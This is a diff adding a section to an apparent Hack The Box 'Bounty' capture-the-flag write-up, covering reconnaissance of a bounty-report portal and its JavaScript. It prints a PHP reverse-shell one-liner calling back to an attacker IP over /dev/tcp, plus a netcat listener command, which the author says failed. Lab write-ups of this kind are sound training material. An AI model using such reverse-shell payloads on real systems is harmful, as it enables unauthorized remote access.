@@ -77,6 +77,45 @@ Let's just try to interact with the portal. We cannot submit credentials (*test*
 We see the database isn't ready (probably because the input here is handled by the *tracket submit* script, which isn't connected to the database yet), but we also understand what it does: it simply adds bounty information in an underlying database.\\
 Since there are no direct interactions with the DB, we can exclude the possibility of SQL injections for now and will have to find something else.
 
+Still in */ressources*, there's a JavaScript script called *bountylog.js*:
+
+<div class="img_container">
+![url]({{https://jsom1.github.io/}}/_images/htb_bounty_url.png)
+</div>
+
+We first see a function called *returnSecret()* which takes data as an argument and then does a POST request to *10.10.11.100/tracker_diRbPr00f314.php*. Below this function, there is another one that crafts an xml message from the fields we can fill on *10.10.11.100/log_submit.php*, and uses the *returnSecret()* function (*btoa* converts from binary to ASCII*). This gives us a good understandding of the application. We saw however that the script isn't connected to the database, so it's not very useful. Ideally, we'd like to find a way to use the portal with the credentials 'test' / no password, but it's still under development (I also tried to ssh in, but it didn't work)...
+
+After playing a while with the reporting system (*/log_submit.php*), I saw that there is nothing displayed when we input "<" in any field... Every other input seems to work:
+
+<div class="img_container">
+![no output]({{https://jsom1.github.io/}}/_images/htb_bounty_nop.png)
+</div>
+
+However, a simple "<" returns no output. II thought about trying a simple one-liner PHP reverse shell as follows, but it didn't work:
+
+<div class="img_container">
+![php]({{https://jsom1.github.io/}}/_images/htb_bounty_php.png)
+</div>
+
+The complete command is the following:
+
+````
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/4444 0>&1'");
+`````
+
+And in the case that would work, we set up a netcat listener on port 4444 as follows: *sudo nc -nlvp 4444*.
+After submitting this, we can inspect the network tab and we see it was Base64 encoded. We can check on any decoding tool:
+
+<div class="img_container">
+![decode]({{https://jsom1.github.io/}}/_images/htb_bounty_decode.png)
+</div>
+
+However, we receive nothing on our listener.
+
+
+
+
+
 ## 3. Privilege escalation
 {:style="color:DarkRed; font-size: 170%;"}
 
